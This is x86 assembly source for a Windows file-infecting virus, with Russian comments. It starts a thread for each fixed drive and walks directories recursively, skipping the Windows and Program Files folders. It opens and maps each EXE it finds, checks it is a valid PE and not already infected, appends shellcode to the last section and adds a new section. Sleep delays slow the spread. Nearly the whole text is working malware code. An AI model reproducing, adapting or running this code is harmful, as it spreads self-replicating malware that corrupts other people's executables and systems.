;===============================================================================;
;ThreadProc2
;Описание: Потоковая процедура для заражения конкретного диска
;Вход:
;	Delta - дельта смещение
;===============================================================================;
ThreadProc2 proc Delta:DWORD
LOCAL BufferForPath:DWORD

	startproc
;Сохраняем рабочую среду до начала работы вируса для возможной обработки ошибок
	mov ebx,Delta
	mov [ebx+OldESP2],esp
	mov [ebx+OldEBP2],ebp
Safe2:
	
;Устанавливаем SEH
	lea eax,[ebx+Safe2]
	CreateSEHFrameEx eax,ebx,[ebx+OldEBP2],[ebx+OldESP2]

	mov ebx,Delta
;Выделяет буфер для функции FindExe
	push ebx
	call AllocBuffer
	mov BufferForPath,eax
;Получаем имя диска
	push dword ptr [ebx+Disk]
	push eax
	apiproc _lstrcpyA
;Прибавим звёзды для поиска
;Вычислим длину строки
	push BufferForPath
	apiproc _lstrlenA                              

	mov edx,BufferForPath
	mov dword ptr [edx+eax],'*.*'
	mov  byte ptr [edx+eax+4],0
;Заражаем все EXE-файлы на конкретном диске
	mov eax,BufferForPath
	push ebx
	push eax
	lea eax,[ebx+FindFunc1]
	push eax
	call FindExe
;Очищаем буфер
	push ebx
	push BufferForPath
	call FreeBuffer
	DeleteSEHFrame
	endproc
	ret
ThreadProc2 endp
;===============================================================================;


;===============================================================================;
;SleepInfection
;Описание: Функция заражает файлы на всех дисках. Для каждого диска порождается поток
;Вход:
;	Delta - дельта смещение
;===============================================================================;
SleepInfection proc Delta:DWORD
LOCAL Buffer:DWORD

	startproc
	mov ebx,Delta
;Выделяем буфер для дисков
	push ebx
	call AllocBuffer
	mov Buffer,eax	
;Получаем диски для заражения
	push eax
	push 255
	apiproc _GetLogicalDriveStringsA

	mov esi,Buffer
NextDrive2:;Перебираем все диски в поисках съемных
	push esi
	apiproc _GetDriveTypeA
	.if eax==DRIVE_FIXED
		mov dword ptr [ebx+Disk],esi
		;Порождаем поток для заражения
		lea eax,[ebx+ThreadId]
		push eax
		push 0
		push ebx
		lea eax,[ebx+ThreadProc2]
		push eax
		push 0
		push NULL
		apiproc _CreateThread 
	.endif
Next2:
	add esi,4
	.if byte ptr [esi]!=0
		push 1000
		apiproc _Sleep;спим 10 секунд
		jmp NextDrive2;Обрабатываем следующий диск
	.endif
	push ebx
	push Buffer
	call FreeBuffer
	endproc
	ret
SleepInfection endp
;===============================================================================;


;===============================================================================;
;Процедура которую вызывает FindExe
;===============================================================================;
FindFunc1 proc Buffer:DWORD,Delta:DWORD
LOCAL hFile:DWORD
LOCAL hMap:DWORD
LOCAL hMapping:DWORD
LOCAL FileSize:DWORD

	startproc
	mov ebx,Delta
;Открываем файл
	push NULL
	push FILE_ATTRIBUTE_NORMAL
	push OPEN_EXISTING
	push NULL
	push FILE_SHARE_WRITE or FILE_SHARE_READ 
	push GENERIC_WRITE or  GENERIC_READ
	push Buffer
	apiproc _CreateFileA
;Проверка на правильность открытия файла
	.if eax==-1
		jmp EndFindFunc1
	.endif
	mov hFile,eax
;Создаем объект "проекция файла"
	push NULL
	push NULL
	push NULL
	PUSH PAGE_READWRITE
	push NULL
	push eax
	apiproc _CreateFileMappingA
;Проверка на правильность создания проекции
	.if eax==0
		jmp EndFindFunc1
	.endif
	mov hMapping,eax
;Проецируем файл на адресное пространство
	push 0
	push 0
	push 0
	push FILE_MAP_ALL_ACCESS
	push eax	
	apiproc _MapViewOfFile
	.if eax==0
		jmp EndFindFunc1
	.endif
	mov hMap,eax
;Правильный файл?
	push hMap
	call ValidPE
	.if eax==0
		jmp ToInfect2
	.endif
;Закрыть описатель проекции
	push hMapping
	apiproc _CloseHandle
;Не заражен ли уже файл?
	push hMap
	call IsInfect
	.if eax==1
		jmp ToInfect2
	.endif
;Есть ли в файле оверлей?
	push 0
	push hFile
	apiproc _GetFileSize
	mov FileSize,eax

	push hMap
	push FileSize
	call IsOverlay
	.IF eax==1
		jmp ToInfect2
	.ENDIF	
;Заражаем файл
	push ebx
	push ShellCodeLength
	lea eax,[ebx+ShellCode]
	push eax	
	push hMap
	push Buffer
	call InfectExLastSection
;Добавляем пустую секцию
	push ebx
	push hMap
	push Buffer
	call NewSection
ToInfect2:;файл уже заражен или его нельзя заразить
	push hMap
	apiproc _UnmapViewOfFile

	push hFile
	apiproc _CloseHandle                   
EndFindFunc1:	
	endproc
	ret
FindFunc1 endp
;===============================================================================;


;===============================================================================;
;Процедура FindExe proc FindFunc:DWORD,Buf:DWORD,Delta:DWORD
;Описание: Поиск и заражение всех exe файлов в указанной директории
;Вход:
;	FindFunc - CALLBACK-функция, которая имеет такой прототип 
;
;	FindFunc1 proc Buffer:DWORD,Delta:DWORD - 
;		Buffer - строка с именем файла
;		Delta - дельта смещение
;
;	Buf - буфер для хранения текущей директории где ищем
;	Delta - дельта смещение
;
;===============================================================================;
FindExe proc FindFunc:DWORD,Buf:DWORD,Delta:DWORD
LOCAL FindData:WIN32_FIND_DATA
LOCAL hFind:DWORD
LOCAL Buffer:DWORD
LOCAL BufferForWindows:DWORD
LOCAL BufferForProgramFiles:DWORD

jmp FindExeCode
	fake1			db		'.',0		;Директории, которые
	fake2			db		'..',0		;НЕ надо сканировать
	ProgramFiles		db		'\Program Files',0
FindExeCode:

	startproc
	mov ebx,Delta
;Выделяем буфер для папки Program Files
	push ebx
	call AllocBuffer
	mov BufferForProgramFiles,eax
;Выделяем буфер для папки Windows
	push ebx
	call AllocBuffer
	mov BufferForWindows,eax	
;Получить путь к папке мастдая
	push 255
	push eax
	apiproc _GetWindowsDirectoryA
;Получаем системный диск для Program Files
	mov edx,BufferForWindows
	mov eax,BufferForProgramFiles

	xor ecx,ecx
	mov cx,word ptr [edx]
	mov word ptr [eax],cx
	mov byte ptr [eax+2],0
;Делаем полный путь к Program Files
	lea eax,[ebx+ProgramFiles]
	push eax
	push BufferForProgramFiles
	apiproc _lstrcatA
;Вычисляем указатель на find_data
	lea  eax,FindData
	push eax
	push Buf
;Ищем файлы
	apiproc _FindFirstFileA
;Если ничего не нашли - выходим. Иначе, сохраним хэндл поиска
	inc     eax                                             
	je      exit
	dec     eax
	mov     hFind,eax
find_next:
;Проверяем, нашли директорию? Если нет - прыгаем на found
	mov     eax,FindData.dwFileAttributes                   
	and     eax,FILE_ATTRIBUTE_DIRECTORY
	je      found
;Вычислим указатель на cFileName
	lea     eax,FindData.cFileName                          
	push eax
	lea eax,[ebx+fake1]
	push eax
;это "."?
	apiproc _lstrcmpiA
;Если да,ищем дальше
	test    eax,eax                                         
	je      next
;Вычислим указатель на cFileName
	lea     eax,FindData.cFileName
	push eax
	lea eax,[ebx+fake2]
	push eax
;это ".."?
	apiproc _lstrcmpiA
;Если да, ищем дальше
	test    eax,eax                                         
	je      next

	push Buf
;Вычислим длину строки
	apiproc _lstrlenA                              
;Вычтем *.*
	sub eax,3                                           
;Сохраним полученную длину
	push eax
	mov edx,Buf
;Если мы всё-таки нашли директорию, то прибавим  к её имени cFileName
	mov byte ptr [edx+eax],0
	lea eax,FindData.cFileName
	push eax
	push Buf
	apiproc _lstrcatA
;Сравниваем с папкой Program Files
	push Buf
	push BufferForProgramFiles
	apiproc _lstrcmpiA
	.if eax==0
		jmp ThisIsWinDir
	.endif
;Сравниваем с папкой Windows
	push Buf
	push BufferForWindows
	apiproc _lstrcmpiA
	.if eax==0
		jmp ThisIsWinDir
	.endif
;Вычислим длину строки
	push Buf
	apiproc _lstrlenA                              

	mov edx,Buf
;Прибавим \*.* для поиска
	mov     dword ptr [edx+eax],'*.*\'
	mov     byte ptr [edx+eax+4],0
;Вызываем процедуру поиска для найденной директории
	push ebx
	push Buf
	push FindFunc
	call FindExe                                     
;Восстановим длину строки
ThisIsWinDir:
	pop eax
	mov edx,Buf
;И восстановим \*.*
	mov     dword ptr [edx+eax-1],'*.*\'
	mov     byte ptr [edx+eax+3],0
;Ищем дальше
	jmp     next                                            

found:
;Вычислим длину cFileName
	lea eax,FindData.cFileName                                  
	push eax                            			         
	apiproc _lstrlenA
;Проверим расширение файла
;Если не равно ищем дальше
	.if (dword ptr [FindData.cFileName+eax-4]!='exe.')
		.if  (dword ptr [FindData.cFileName+eax-4]!='EXE.')
			jmp next
		.endif
	.endif
;Убираем из строки с каталогом - *.*
	push Buf
	apiproc _lstrlenA                              
;Вычтем *.*
	sub eax,3                                           
	mov edx,Buf
	xor ecx,ecx
;Сохраняем *
	mov cl,byte ptr [edx+eax]
;Сохраняем байт со *
	push ecx
	mov byte ptr [edx+eax],0
	lea eax,[edx+eax]
;Сохраняем индеск
	push eax
;Выделяем буфер для полного имени
	push PAGE_READWRITE
	push MEM_RESERVE or MEM_COMMIT
	push 255
	push NULL
	apiproc _VirtualAlloc
	mov Buffer,eax	
;Копируем каталог
	push Buf
	push eax
	apiproc _lstrcpyA
;Восстанавливаем индекс
	pop eax
;Восстанавливаем байт со *
	pop ecx
	mov byte ptr [eax],cl
;Сливаем с именем файла
	lea edx,FindData.cFileName
	push edx
	push Buffer
	apiproc _lstrcatA
;Рекурсивный вызов для подкаталога
	push ebx
	push Buffer
	call FindFunc

	push ebx
	push Buffer
	call FreeBuffer
	
	push 300000
	apiproc _Sleep;Спим 300 секунд
next:
;Вычислим указатель на find_data
	lea     eax,FindData                                  
	push eax
	push hFind
;Ищем следующий файл
	apiproc _FindNextFileA             
	test    eax,eax
;Если ничего не нашли
	jne     find_next
	push hFind
;Закрываем хэндл поиска
	apiproc _FindClose
;Очищаем буфера
	push ebx
	push Buffer
	call FreeBuffer
	push ebx
	push BufferForWindows
	call FreeBuffer
	push ebx
	push BufferForProgramFiles
	call FreeBuffer
exit:
	endproc
	ret
FindExe endp
;===============================================================================;